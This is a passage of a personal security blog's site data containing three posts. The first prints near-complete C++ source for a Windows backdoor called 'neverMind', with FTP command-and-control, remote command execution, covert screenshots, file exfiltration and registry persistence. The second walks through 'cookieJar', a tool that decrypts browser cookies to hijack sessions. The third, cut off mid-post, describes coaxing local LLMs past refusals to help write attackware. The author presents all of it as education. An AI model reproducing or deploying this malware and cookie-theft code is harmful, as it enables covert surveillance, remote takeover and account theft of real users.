file_path); file \u0026lt;\u0026lt; content; } path_exists(const std::string\u0026amp; path): checks if a path exists in the file system and returns a boolean value indicating the result.\nbool wrapper::path_exists(const std::string\u0026amp; path) { return std::filesystem::exists(path); } system information retrieval get_username(): retrieves the username of the current user from the environment variables.\nstd::string wrapper::get_username() { char env[] = \u0026#34;USERNAME\u0026#34;; DWORD username_len = 257; char buffer[4096]; unsigned int out_size = GetEnvironmentVariableA(env, buffer, username_len); return std::string(buffer, out_size); } last_error_string(): Retrieves the last error message recorded by the system.\nstd::string wrapper::last_error_string() { DWORD errorMessageID = ::GetLastError(); if (errorMessageID == 0) return std::string(); // no error recorded LPSTR messageBuffer = nullptr; size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)\u0026amp;messageBuffer, 0, NULL); std::string message(messageBuffer, size); LocalFree(messageBuffer); // free up the buffer return message; } listdir(const std::string\u0026amp; path): Lists the contents of a directory specified by path and returns them as a vector of strings.\nstd::vector\u0026lt;std::string\u0026gt; wrapper::listdir(const std::string\u0026amp; path) { std::vector\u0026lt;std::string\u0026gt; directory_content; for (const auto\u0026amp; val : std::filesystem::directory_iterator(path)) { std::string content = val.path().u8string(); std::size_t last_idx = content.find_last_of(\u0026#34;\\\\\u0026#34;); directory_content.push_back(content.substr(last_idx + 1)); } return directory_content; } get_date(): Returns the current date and time as a string in the format \u0026ldquo;dd-mm-yyyy_hh-mm-ss\u0026rdquo;.\nstd::string wrapper::get_date() { auto t = std::time(nullptr); auto tm = *std::localtime(\u0026amp;t); std::ostringstream oss; oss \u0026lt;\u0026lt; std::put_time(\u0026amp;tm, \u0026#34;%d-%m-%Y_%H-%M-%S\u0026#34;); return oss.str(); } screen capture createBitmapHeader(int width, int height): creates a bitmap header with the specified width and height.\nBITMAPINFOHEADER wrapper::createBitmapHeader(int width, int height) { BITMAPINFOHEADER bi; bi.biSize = sizeof(BITMAPINFOHEADER); bi.biWidth = width; bi.biHeight = height; bi.biPlanes = 1; bi.biBitCount = 32; bi.biCompression = BI_RGB; bi.biSizeImage = 0; bi.biXPelsPerMeter = 0; bi.biYPelsPerMeter = 0; bi.biClrUsed = 0; bi.biClrImportant = 0; return bi; } GdiPlusScreenCapture(HWND hWnd): captures the screen of the window specified by hWnd and returns a handle to the bitmap of the screenshot.\nHBITMAP wrapper::GdiPlusScreenCapture(HWND hWnd) { HDC hwindowDC = GetDC(hWnd); HDC hwindowCompatibleDC = CreateCompatibleDC(hwindowDC); SetStretchBltMode(hwindowCompatibleDC, COLORONCOLOR); int scale = 1; int screenx = GetSystemMetrics(SM_XVIRTUALSCREEN); int screeny = GetSystemMetrics(SM_YVIRTUALSCREEN); int width = GetSystemMetrics(SM_CXVIRTUALSCREEN); int height = GetSystemMetrics(SM_CYVIRTUALSCREEN); HBITMAP hbwindow = CreateCompatibleBitmap(hwindowDC, width, height); BITMAPINFOHEADER bi = wrapper::createBitmapHeader(width, height); SelectObject(hwindowCompatibleDC, hbwindow); StretchBlt(hwindowCompatibleDC, 0, 0, width, height, hwindowDC, screenx, screeny, width, height, SRCCOPY); GetDIBits(hwindowCompatibleDC, hbwindow, 0, height, lpbitmap, (BITMAPINFO*)\u0026amp;bi, DIB_RGB_COLORS); DeleteDC(hwindowCompatibleDC); ReleaseDC(hWnd, hwindowDC); return hbwindow; } saveToMemory(HBITMAP* hbitmap, std::vector\u0026lt;BYTE\u0026gt;\u0026amp; data, std::string dataFormat): saves a bitmap specified by hbitmap to memory in the format specified by dataFormat and stores the data in data.\nbool wrapper::saveToMemory(HBITMAP* hbitmap, std::vector\u0026lt;BYTE\u0026gt;\u0026amp; data, std::string dataFormat) { Gdiplus::Bitmap bmp(*hbitmap, nullptr); IStream* istream = nullptr; CreateStreamOnHGlobal(NULL, TRUE, \u0026amp;istream); CLSID clsid; if (dataFormat.compare(\u0026#34;bmp\u0026#34;) == 0) { CLSIDFromString(L\u0026#34;{557cf400-1a04-11d3-9a73-0000f81ef32e}\u0026#34;, \u0026amp;clsid); } else if (dataFormat.compare(\u0026#34;jpg\u0026#34;) == 0) { CLSIDFromString(L\u0026#34;{557cf401-1a04-11d3-9a73-0000f81ef32e}\u0026#34;, \u0026amp;clsid); } else if (dataFormat.compare(\u0026#34;gif\u0026#34;) == 0) { CLSIDFromString(L\u0026#34;{557cf402-1a04-11d3-9a73-0000f81ef32e}\u0026#34;, \u0026amp;clsid); } else if (dataFormat.compare(\u0026#34;tif\u0026#34;) == 0) { CLSIDFromString(L\u0026#34;{557cf405-1a04-11d3-9a73-0000f81ef32e}\u0026#34;, \u0026amp;clsid); } else if (dataFormat.compare(\u0026#34;png\u0026#34;) == 0) { CLSIDFromString(L\u0026#34;{557cf406-1a04-11d3-9a73-0000f81ef32e}\u0026#34;, \u0026amp;clsid); } Gdiplus::Status status = bmp.Save(istream, \u0026amp;clsid, NULL); if (status != Gdiplus::Status::Ok) return false; HGLOBAL hg = NULL; GetHGlobalFromStream(istream, \u0026amp;hg); int bufsize = GlobalSize(hg); data.resize(bufsize); LPVOID pimage = GlobalLock(hg); memcpy(\u0026amp;data[0], pimage, bufsize); GlobalUnlock(hg); istream-\u0026gt;Release(); return true; } screenshot(const std::string\u0026amp; path): takes a screenshot, saves it as a JPEG file in the directory specified by path, and returns the full path of the screenshot file.\nstd::string wrapper::screenshot(const std::string\u0026amp; path) { std::string full_path = (std::filesystem::path(path) / std::filesystem::path((wrapper::get_date() + \u0026#34;.jpg\u0026#34;))).u8string(); GdiplusStartupInput gdiplusStartupInput; ULONG_PTR gdiplusToken; GdiplusStartup(\u0026amp;gdiplusToken, \u0026amp;gdiplusStartupInput, NULL); HWND hWnd = GetDesktopWindow(); HBITMAP hBmp = wrapper::GdiPlusScreenCapture(hWnd); std::vector\u0026lt;BYTE\u0026gt; data; std::string dataFormat = \u0026#34;jpg\u0026#34;; if (wrapper::saveToMemory(\u0026amp;hBmp, data, dataFormat)) { std::ofstream fout(full_path, std::ios::binary); fout.write((char*)data.data(), data.size()); } else return \u0026#34;\u0026#34;; GdiplusShutdown(gdiplusToken); return full_path; } this function initializes GDI+, captures the screen, saves the captured image to memory in JPEG format, writes the image data to a file, and then shuts down GDI+. the file is saved in the directory specified by path and its name is the current date and time. the full path of the file is returned. if the image cannot be saved to memory, an empty string is returned.\nftpC the ftpC class defined in ftp.h and implemented in ftp.cpp provides a set of functions for FTP operations. the ftpC class uses the WinINet API to perform FTP operations. The m_host, m_username, and m_password member variables store the host, username, and password for the FTP connection. The ftpIO and ftpS member variables are handles to the internet connection and the FTP session, respectively.\nconstructor + destructor ftpC(const std::string\u0026amp; host, const std::string\u0026amp; username, const std::string\u0026amp; password): the constructor initializes the FTP connection with the provided host, username, and password.\nftpC::ftpC(const std::string\u0026amp; host, const std::string\u0026amp; username, const std::string\u0026amp; password) : m_host(host), m_username(username), m_password(password), ftpIO(NULL), ftpS(NULL) { } ~ftpC(): the destructor cleans up the FTP connection by closing the internet + FTP handles.\nftpC::~ftpC() { if (ftpS) { InternetCloseHandle(ftpS); ftpS = NULL; } if (ftpIO) { InternetCloseHandle(ftpIO); ftpIO = NULL; } } FTP operations connect(): this function opens an internet connection and connects to the FTP server using the provided host, username, and password. if it fails to open the connection or connect to the FTP server, it throws a runtime error.\nvoid ftpC::connect() { ftpIO = InternetOpenA(\u0026#34;SystemConnection\u0026#34;, INTERNET_OPEN_TYPE_DIRECT, m_host.c_str(), 0, INTERNET_FLAG_CACHE_IF_NET_FAIL); if (ftpIO == NULL) { DWORD error = GetLastError(); LPVOID lpMsgBuf; FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPTSTR)\u0026amp;lpMsgBuf, 0, NULL); std::string errorMessage = static_cast\u0026lt;char*\u0026gt;(lpMsgBuf); LocalFree(lpMsgBuf); throw std::runtime_error(\u0026#34;[!] failed to open connection: \u0026#34; + errorMessage); } ftpS = InternetConnectA(ftpIO, m_host.c_str(), INTERNET_DEFAULT_FTP_PORT, m_username.c_str(), m_password.c_str(), INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0); if (ftpS == NULL) { DWORD error = GetLastError(); LPVOID lpMsgBuf; FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPTSTR)\u0026amp;lpMsgBuf, 0, NULL); std::string errorMessage = static_cast\u0026lt;char*\u0026gt;(lpMsgBuf); LocalFree(lpMsgBuf); throw std::runtime_error(\u0026#34;[!] failed to connect to ftp server: \u0026#34; + errorMessage); } } upload_file(const std::string\u0026amp; local_path, const std::string\u0026amp; server_name): this function uploads a file from the local path to the FTP server with the specified server name. it returns true if the upload is successful.\nbool ftpC::upload_file(const std::string\u0026amp; local_path, const std::string\u0026amp; server_name) { BOOL result = FtpPutFileA(ftpS, local_path.c_str(), server_name.c_str(), FTP_TRANSFER_TYPE_BINARY, 0); return result; } retr_file(const std::string\u0026amp; local_path, const std::string\u0026amp; server_name): this function downloads a file from the FTP server to the local path.\nbool ftpC::retr_file(const std::string\u0026amp; local_path, const std::string\u0026amp; server_name) { BOOL result = FtpGetFileA(ftpS, server_name.c_str(), local_path.c_str(), 0, 0, FTP_TRANSFER_TYPE_BINARY, INTERNET_FLAG_HYPERLINK); return result; } mkdir(const std::string\u0026amp; folder_name): this function creates a new directory on the FTP server with the specified folder name.\nbool ftpC::mkdir(const std::string\u0026amp; folder_name) { BOOL result = FtpCreateDirectoryA(ftpS, folder_name.c_str()); return result; } cd(const std::string\u0026amp; server_path): this function changes the current directory on the FTP server to the directory specified by server_path.\nbool ftpC::cd(const std::string\u0026amp; server_path) { BOOL result = FtpSetCurrentDirectoryA(ftpS, server_path.c_str()); return result; } neverMind the neverMind class defined in neverMind.h and implemented in neverMind.cpp provides a set of functions for backdoor operations.\nconstructor + destructor neverMind(const std::string \u0026amp;host, const std::string \u0026amp;username, const std::string \u0026amp;password): the constructor initializes the backdoor with the provided FTP host, username, and password. it also sets up paths for the backdoor.\nneverMind::neverMind(const std::string \u0026amp;host, const std::string \u0026amp;username, const std::string \u0026amp;password) : ftp_host(host), ftp_username(username), ftp_password(password), ftp_connection(ftpC(ftp_host, ftp_username, ftp_password)), win_username(wrapper::get_username()), store_path(\u0026#34;C:\\\\Users\\\\\u0026#34; + win_username + \u0026#34;\\\\AppData\\\\Local\\\\SystemConnect\u0026#34;), data_path((std::filesystem::path(store_path) / \u0026#34;data\u0026#34;).u8string()), app_path((std::filesystem::path(store_path) / \u0026#34;app\u0026#34;).u8string()), output_path((std::filesystem::path(data_path) / \u0026#34;output.txt\u0026#34;).u8string()) { } ~neverMind(): the destructor is empty as there are no specific resources that need to be cleaned up. this can be modified by you!\nneverMind::~neverMind() { } backdoor operations start(): this function opens the backdoor, sets up necessary directories, connects to the FTP server, downloads + executes commands, and manages the registry.\nvoid neverMind::start() { if (!std::filesystem::exists(store_path)) setup(); ftp_connection.connect(); if (!ftp_connection.cd(win_username)) { ftp_connection.mkdir(win_username); ftp_connection.cd(win_username); } std::string file_path = (std::filesystem::path(app_path) / \u0026#34;cmd.txt\u0026#34;).u8string(); if (ftp_connection.retr_file(file_path, \u0026#34;cmd.txt\u0026#34;)) { Sleep(1500); compile(file_path); } ftp_connection.upload_file(output_path, \u0026#34;output.txt\u0026#34;); Sleep(2000); } setup(): this function sets up necessary directories and adds the backdoor to the registry for persistence.\nvoid neverMind::setup() { std::filesystem::create_directory(store_path); std::filesystem::create_directory(data_path); std::filesystem::create_directory(app_path); add_to_reg(); } add_to_reg(): this function adds the backdoor to the registry for persistence. it copies the current executable to a new location and adds it to the startup registry key. the command reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v SysConnection /t REG_SZ /d \\\u0026quot;\u0026quot; + dest + \u0026quot;\\\u0026quot; adds a new entry SysConnection to the Run key in the Windows Registry. the entry contains the path of the neverMind executable. as a result, the backdoor will be executed every time the user logs on to Windows.\nvoid neverMind::add_to_reg() { WCHAR path[MAX_PATH]; int len = GetModuleFileNameW(NULL, path, MAX_PATH); std::string new_path; std::string dest = (std::filesystem::path(store_path) / \u0026#34;explore.exe\u0026#34;).u8string(); for (int i = 0; i \u0026lt; len; ++i) new_path += path[i]; std::filesystem::copy_file(new_path, dest); system(std::string(\u0026#34;reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v SysConnection /t REG_SZ /d \\\u0026#34;\u0026#34; + dest + \u0026#34;\\\u0026#34;\u0026#34;).c_str()); } compile(const std::string \u0026amp;file_path): this function compiles + executes commands from a file. it reads the file, splits each line into commands, and executes them.\nvoid neverMind::compile(const std::string \u0026amp;file_path) { std::string code = wrapper::read_file(file_path); std::stringstream ss_code(code); std::string line; while (std::getline(ss_code, line)) { try { std::vector\u0026lt;std::string\u0026gt; spl_line; std::stringstream ss_line(line); std::string command; while (std::getline(ss_line, command, \u0026#39; \u0026#39;)) { spl_line.push_back(command); } execute(spl_line); } catch (...) { continue; } } } execute(const std::vector\u0026lt;std::string\u0026gt;\u0026amp; spl_line): this function executes the provided commands. it supports several commands like print, screen, upload, download, exec. each command performs a specific operation and writes the result to the output file.\nvoid neverMind::execute(const std::vector\u0026lt;std::string\u0026gt;\u0026amp; spl_line) { try { std::string main_cmd = spl_line[0]; if (main_cmd == \u0026#34;print\u0026#34;) { if (spl_line.size() \u0026lt; 2) { wrapper::append_file(output_path, \u0026#34;[!] error [!]\\n\\n\u0026#34;); return; } wrapper::append_file(output_path, \u0026#34;[\u0026gt;] \u0026#34; + spl_line[1] + \u0026#34; [\u0026lt;]\\n\\n\u0026#34;); } else if (main_cmd == \u0026#34;screen\u0026#34;) { if (spl_line.size() \u0026lt; 2) { wrapper::append_file(output_path, \u0026#34;[!] error [!]\\n\\n\u0026#34;); return; } int counter = std::stoi(spl_line[1]); if (!ftp_connection.cd(\u0026#34;screens\u0026#34;)) { ftp_connection.mkdir(\u0026#34;screens\u0026#34;); ftp_connection.cd(\u0026#34;screens\u0026#34;); } for (int i = 0; i \u0026lt; counter; ++i) { std::string screenshot_path = wrapper::screenshot(data_path); Sleep(500); ftp_connection.upload_file(screenshot_path, std::filesystem::path(screenshot_path).filename().u8string()); Sleep(1000); wrapper::append_file(output_path, \u0026#34;[++] screenshots saved \u0026gt;\u0026gt; \u0026#34; + screenshot_path + \u0026#34; [++]\\n\\n\u0026#34;); } ftp_connection.cd(\u0026#34;../\u0026#34;); } else if (main_cmd == \u0026#34;upload\u0026#34;) { if (spl_line.size() \u0026lt; 3) { wrapper::append_file(output_path, \u0026#34;[!] error [!]\\n\\n\u0026#34;); return; } if (!ftp_connection.cd(\u0026#34;uploads\u0026#34;)) { wrapper::append_file(output_path, \u0026#34;[!] folder not found [!]\\n\\n\u0026#34;); return; } if (ftp_connection.retr_file(spl_line[2], spl_line[1])) wrapper::append_file(output_path, \u0026#34;[++] file upload successful [++]\\n\\n\u0026#34;); else wrapper::append_file(output_path, \u0026#34;[!!] upload error [!!]\\n\\n\u0026#34;); ftp_connection.cd(\u0026#34;../\u0026#34;); } else if (main_cmd == \u0026#34;download\u0026#34;) { if (spl_line.size() \u0026lt; 2) { wrapper::append_file(output_path, \u0026#34;[!] error [!]\\n\\n\u0026#34;); return; } if (!ftp_connection.cd(\u0026#34;downloads\u0026#34;)) { ftp_connection.mkdir(\u0026#34;downloads\u0026#34;); ftp_connection.cd(\u0026#34;downloads\u0026#34;); } if (ftp_connection.upload_file(spl_line[1], std::filesystem::path(spl_line[1]).filename().u8string())) wrapper::append_file(output_path, \u0026#34;[++] file download successful [++]\\n\\n\u0026#34;); else wrapper::append_file(output_path, \u0026#34;[!!] downloading error [!!]\\n\\n\u0026#34;); ftp_connection.cd(\u0026#34;../\u0026#34;); } else if (main_cmd == \u0026#34;exec\u0026#34;) { if (spl_line.size() \u0026lt; 2) { wrapper::append_file(output_path, \u0026#34;[!] error [!]\\n\\n\u0026#34;); return; } WinExec(std::string(\u0026#34;cmd \\\u0026#34;d:\u0026#34; + spl_line[1] + \u0026#34;f\\\u0026#34;\u0026#34;).c_str(), 0); } else { wrapper::append_file(output_path, \u0026#34;[!!] command: \u0026#34; + main_cmd + \u0026#34;not found [!!]\\n\\n\u0026#34;); } } catch (...) { wrapper::append_file(output_path, \u0026#34;[!!] error [!!]\\n\\n\u0026#34;); } } main the main.cpp file creates an instance M of the neverMind class and starts the backdoor. it\u0026rsquo;s the entry point of the application, and it contains the wWinMain function, which is the entry point in a Windows application linked with the UNICODE character set. the host, username, and password are the credentials of the FTP server. the neverMind object M is created and the backdoor is started by calling M.start().\nint WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR szCmdLine, int CmdShow) { const std::string host = \u0026#34;host\u0026#34;; const std::string username = \u0026#34;username\u0026#34;; const std::string password = \u0026#34;password\u0026#34;; neverMind M(host, username, password); M.start(); return 0; } HINSTANCE hInstance: a handle to the current instance of the application.\nHINSTANCE hPrevInstance: a handle to the previous instance of the application. this parameter is always NULL in modern Windows applications.\nPWSTR szCmdLine: a pointer to a null-terminated string specifying the command line for the application, excluding the program name.\nint CmdShow: controls how the window is to be shown. this parameter can be one of the following values: SW_HIDE, SW_MAXIMIZE, SW_MINIMIZE, SW_RESTORE, SW_SHOW, SW_SHOWDEFAULT, SW_SHOWMAXIMIZED, SW_SHOWMINIMIZED, SW_SHOWMINNOACTIVE, SW_SHOWNA, SW_SHOWNOACTIVATE, SW_SHOWNORMAL.\nconclusion neverMind is a demonstration (ahem) of a backdoor application that uses FTP for C2 (command + control) operations. it\u0026rsquo;s written in C++ and uses the Windows API and WinINet API for network operations. the program has 3 main components: the ftpC class, the neverMind class, and the main.cpp file.\nftpC provides a set of functions for FTP operations, including connecting to an FTP server, uploading/downloading files, and creating/switching directories. it uses the WinINet API, which is a high-level API for working with FTP, HTTP, and Gopher protocols.\nneverMind uses the ftpC class to connect to the FTP server and perform file operations. it contains methods for setting up and starting the backdoor, compiling + executing commands from a file, and adding the backdoor to the Windows Registry for persistence.\nmain.cpp is the entry point of the app. it creates an instance of the neverMind class with the FTP server credentials and starts the backdoor.\ni wrote this program to better learn and understand how backdoors work and how they can use FTP for C2 operations. as a result, i learned how to use the Windows and WinINet APIs, how to work with the Windows Registry for persistence, and how to execute system commands and capture their output.\nit\u0026rsquo;s important to note that this program is a demonstration of malware. it should not be used illegally. understanding how such software works can help in developing security measures + tools to detect and remove such threats. it can also be used to learn more about system internals and network programming.\nhappy hacking!\n","date":"2024-01-18","permalink":"//localhost:1313/posts/nevermind/","section":"","summary":"","tags":[],"title":"neverMind"},{"categories":[],"contents":"first time running with the cinestill 400d. it\u0026rsquo;s quite a finicky film, and i\u0026rsquo;m not sure i have the skill or patience (yet) to deal with its many quirks.\n","date":"2024-01-03","permalink":"//localhost:1313/photography/new_post10/","section":"","summary":"","tags":[],"title":"cinestill 400d"},{"categories":[],"contents":"a fun aspect of pentesting is finding interesting ways to get authenticated sessions running. usually, a session authentication relies on the user entering some kind of key (password) that corresponds to their user ID (username). however, in some cases an attacker can \u0026ldquo;revive\u0026rdquo; sessions using just the session cookies.\ni wrote cookieJar for exactly this purpose: extracting cookies from various browsers (and factor in the OS) and then use them to create authenticated sessions. the script handles different formats and encryption methods (see: Cryptodome) and can extract cookies related to all websites or a specific domain.\nsome limitiations of the script:\nif browsers update their cookie storage mechanisms (very likely), the script will stop working.\naccounts with 2FA will stop the script from working.\nsessions are managed server-side, so if specific parameters like user-agent, IP address, etc. don\u0026rsquo;t line up, the script will stop working.\nconsent + security risks\u0026hellip;\ncookieJar uses several libraries and modules to retrieve, decrypt, and manage browser cookies across multiple browsers and operating systems. arguably, the most important module i\u0026rsquo;ve used is Cryptodome, which is included in the source repo .\nCryptodome the Cryptodome module contains the pycryptodome library, which is used for secure hashing and encryption services. in the context of cookieJar, it\u0026rsquo;s used for decrypting cookies.\nAES.py: used for decrypting cookies from browsers like chrome, opera, edge.\nKDF.py: a key derivation function that\u0026rsquo;s used to generate a cryptographic key from a password. used in the PBKDF2 function in cookieJar.\npadding.py: used in block cipher algorithms to ensure that the last block of data is the correct size. used in unpad to remove padding from the decrypted data.\nlz4.block: part of the lz4 library, which provides bindings for the LZ4 compression algorithm. used specifically for handling cookies from firefox, which uses the compression algorithm to store its cookies.\ncookieJar cookieJar is a comprehensive python script for security research and penetration testing, as it allows researchers to analyze the cookies stored by a browser, which can contain sensitive information such as session identifiers and login tokens.\n\u0026lt;http.cookiejar.Cookie version=0 name=\u0026#39;sessionid\u0026#39; value=\u0026#39;1234567890abcdef\u0026#39; port=None port_specified=False domain=\u0026#39;instagram.com\u0026#39; domain_specified=True domain_initial_dot=False path=\u0026#39;/\u0026#39; path_specified=True secure=True expires=1672444800 discard=False comment=None comment_url=None rest={\u0026#39;HttpOnly\u0026#39;: None}, rfc2109=False\u0026gt; this cookie has the following properties:\nname: the name of the cookie (sessionid).\nvalue: the value of the cookie, usually a unique identifier that the server uses to recognize the client.\ndomain: the domain that set the cookie (instagram.com).\npath: path on the domain where the cookie is valid. in this case, it\u0026rsquo;s /, meaning the cookie is valid for the entire domain.\nsecure: a boolean value indicating whether the cookie should only be sent over secure (HTTPS) connections.\nexpires: expiration date of the cookie as a timestamp (1672444800 corresponds to january 1st, 2024).\nHttpOnly: a flag indicating whether the cookie is inaccessible to javascript\u0026rsquo;s Document.cookie API to mitigate XSS attacks.\nthe actual data stored in a cookie can vary greatly depending on the website and the purpose of the cookie. for example, a session cookie might contain a unique identifier that the server uses to keep track of your session, while a preference cookie might contain information about your preferred language or other settings.\nwhen cookieJar collects cookies, it stores them in a http.cookiejar.CookieJar object. this object behaves like a list of http.cookiejar.Cookie objects, and you can iterate over it to access individual cookies.\ncookies = load() for cookie in cookies: print(cookie) this will print out all the cookies stored in the CookieJar, one per line.\nimporting necessary libraries the script first imports some standard and 3rd-party libraries. they provide the necessary functionalities for file handling, database operations, encryption and more.\nimport base64 import configparser import contextlib import glob import http.cookiejar import json import os import struct import subprocess import sys import tempfile from io import BytesIO from typing import Union it also imports the sqlite3 library, which is used to interact with SQLite databases that many browsers use to store cookies. if the pysqlite2.dbapi2 module is available, it\u0026rsquo;s used instead of the standard sqlite3 module (improved performance + additional features).\ntry: from pysqlite2 import dbapi2 as sqlite3 except ImportError: import sqlite3 for linux/BSD, the script imports either dbus or jeepney. these are used to interact with the d-bus message system, a mechanism that allows different parts of the system to communicate with each other. in this case, it\u0026rsquo;s used to retrieve the encryption key for cookies from the system\u0026rsquo;s keyring.\nif sys.platform.startswith(\u0026#39;linux\u0026#39;) or \u0026#39;bsd\u0026#39; in sys.platform.lower(): try: import dbus USE_DBUS_LINUX = True except ImportError: import jeepney from jeepney.io.blocking import open_dbus_connection USE_DBUS_LINUX = False the lz4.block is imported for handling LZ4-compressed cookies from firefox. LZ4 is a fast, lossless compression algorithm that firefox uses to store its cookies.\nimport lz4.block finally, the script imports the aforementioned modules from the Cryptodome library.\nfrom Cryptodome.Cipher import AES from Cryptodome.Protocol.KDF import PBKDF2 from Cryptodome.Util.Padding import unpad defining constants + helper functions the script defines a constant for the default chromium password, used as the key for encrypting cookies in chromium-based browsers. it also defines a custom exception class for browser cookie errors.\nclass ChromiumBasedBrowser: ... def load(self): ... # decrypt the cookie value value = self._decrypt(value, enc_value) ... def _decrypt(self, value, encrypted_value): ... data = aes.decrypt_and_verify(encrypted_value[12:-16], tag) ... return data.decode() the firefox class handles cookies from firefox, using the lz4.block module to decompress LZ4-compressed cookies.\nclass Firefox: ... def __add_session_cookies_lz4(self, cj): ... json_data = json.loads(lz4.block.decompress(file_obj.read())) ... loading cookies from all browsers the load function loads cookies from all supported browsers and returns them in a combined http.cookiejar.CookieJar object. this function iterates over a list of functions that load cookies from each supported browser, and adds all the cookies they return to a single CookieJar.\ndef load(domain_name=\u0026#34;\u0026#34;): # function to load cookies from all supported browsers and return combined cookie jar cj = http.cookiejar.CookieJar() for cookie_fn in [chrome, chromium, opera, opera_gx, brave, edge, vivaldi, firefox, safari]: try: for cookie in cookie_fn(domain_name=domain_name): cj.set_cookie(cookie) except BrowserCookieError: pass return cj the script includes a separate class for each browser, as each browser stores its cookies differently. these classes inherit from the Browser base class, which provides common functionality, and override the load method to implement specific cookie extraction and decryption.\nfor example, the Chrome class handles cookies from google chrome.\nclass Chrome(ChromiumBasedBrowser): def __init__(self, cookie_file=None, domain_name=\u0026#34;\u0026#34;, key_file=None): super().__init__(cookie_file, domain_name, key_file) the firefox class handles cookies from firefox, but overrides the load method to handle firefox unique cookie storage format.\nclass Firefox(Browser): def __init__(self, cookie_file=None, domain_name=\u0026#34;\u0026#34;): super().__init__(cookie_file, domain_name) def load(self): ... decrypting cookies the ability to decrypt encrypted cookies is the most important part of cookieJar. it\u0026rsquo;s done using the Cryptodome library, which provides a variety of cryptographic recipes and primitives.\nthe decryption process varies depending on the browser and the OS. for example, chromium-based browsers on windows use the windows data protection API (DPAPI) to encrypt cookies, while on linux/macOS, they use AES encryption with a key derived from a predefined password.\nthe _decrypt method in the ChromiumBasedBrowser handles this decryption process. it first checks the OS, then uses the appropriate decryption method.\ndef _decrypt(self, value, encrypted_value): # method to decrypt encoded cookies ... if sys.platform == \u0026#39;win32\u0026#39;: try: # try to decrypt using the Windows Chromium method decrypted_value = _crypt_unprotect_data(encrypted_value) except Exception: return value else: # for Linux \u0026amp; Mac, we have to remove the \u0026#39;v10\u0026#39; or \u0026#39;v11\u0026#39; prefix encrypted_value = encrypted_value[3:] nonce, tag = encrypted_value[:12], encrypted_value[-16:] cipher = AES.new(self.v10_key, AES.MODE_GCM, nonce=nonce) decrypted_value = cipher.decrypt_and_verify(encrypted_value[12:-16], tag) return decrypted_value.decode(\u0026#39;utf-8\u0026#39;) in the case of windows, the _crypt_unprotect_data function is used to decrypt the cookie using the DPAPI. this function uses the CryptUnprotectData function from the crypt32.dll library, which is a part of the windows API.\ndef _crypt_unprotect_data( cipher_text=b\u0026#39;\u0026#39;, entropy=b\u0026#39;\u0026#39;, reserved=None, prompt_struct=None, is_key=False ): ... if not ctypes.windll.crypt32.CryptUnprotectData( ctypes.byref(blob_in), ctypes.byref(desc), ctypes.byref(blob_entropy), reserved, prompt_struct, CRYPTPROTECT_UI_FORBIDDEN, ctypes.byref(blob_out) ): # if the function fails, raise a RuntimeError raise RuntimeError(\u0026#39;Failed to decrypt the cipher text with DPAPI\u0026#39;) # raise an error on linux/macOS, the script uses the AES algorithm from the Cryptodome.Cipher module to decrypt the cookies. the key for the AES encryption is derived from the predefined password using the PBKDF2 algorithm from the Cryptodome.Protocol.KDF module.\naes = AES.new(self.v10_key, AES.MODE_GCM, nonce=nonce) data = aes.decrypt_and_verify(encrypted_value[12:-16], tag) error handling issues can arise when dealing with cookies. for example, if a browser\u0026rsquo;s cookies are stored in a SQLite database, and that database is locked because the browser is currently using it, the script creates a temporary copy of the database to avoid a locking error.\ndef _create_local_copy(cookie_file): ... with contextlib.closing(sqlite3.connect(\u0026#39;file:{}?mode=ro\u0026#39;.format(pathname2url(cookie_file)), uri=True)) as conn: with tempfile.TemporaryFile() as tmp_file: for line in conn.iterdump(): tmp_file.write(\u0026#39;{}\\n\u0026#39;.format(line).encode(\u0026#39;utf-8\u0026#39;)) tmp_file.seek(0) conn_temp = sqlite3.connect(\u0026#39;file:{}?mode=rw\u0026#39;.format(pathname2url(tmp_file.name)), uri=True) return conn_temp the script also includes a custom exception class: BrowserCookieError. it\u0026rsquo;s raised when there\u0026rsquo;s an error retrieving or decrypting cookies, this allows the script to fail gracefully and provide usefull error messages.\nclass BrowserCookieError(Exception): pass conclusion i wrote this for the same reason i wrote everything else: education. cookieJar illustrates key security concepts, specifically those related to web security, encryption, and data storage.\n","date":"2024-01-02","permalink":"//localhost:1313/posts/cookiejar/","section":"","summary":"","tags":[],"title":"cookieJar"},{"categories":[],"contents":" since splurging on a new macbook m3 pro, that came with a 12-core CPU, 18-core GPU, 16-core neural engine, and 36GB of RAM, i thought to myself: i should probably use this to train some version of a local AI (LLM) i can use to boost my security and hacking toolchains, namely SAST/DAST and vulnerability scanning. thus began my journey into acquiring the perfect flavours of AI that were ideal for how i work (iteratively but in bursts, and lots of back and forth). i won\u0026rsquo;t go into too much detail about my exact setups, as that\u0026rsquo;s more appropriate for a separate post, but here\u0026rsquo;s a general overview:\nLLM #1: deepseek-coder-6.7b over codellama-13b-instruct LLM #2: mixtral-7b-instruct LLM #3: qwen-7b-chat prompt all three LLMs, and then use a majority consensus script to rate the highest answer (works only for reasoning questions, not so much programming\u0026hellip;yet)\nwhen it comes to analyzing and/or writing attackware, the LLMs are rightfully hesitant, and may also outright refuse. in this case, it helps to know how to write it yourself and get advice/suggestions on specific functions that may need to be refactored. a harsh attitude may sometimes work in forcing the LLM to respond, but with a personalized setup like mine, a slower, gentler attitude seems to work, for now.\nhere\u0026rsquo;s a (very) basic example of how deepseek responds when prompted to create a simple botnet.\ndisclaimer: this was an incredibly interesting and exciting project, but i wrote this post with some hesitation. for legal reasons, the code provided on my github is intentionally broken/truncated in parts to stop it from working off rip. however, i\u0026rsquo;ve left most of the functionality intact so the public can learn from it, and the security community can learn to protect themselves from it and similar attacks.\ndisclaimer: this post was authored with the 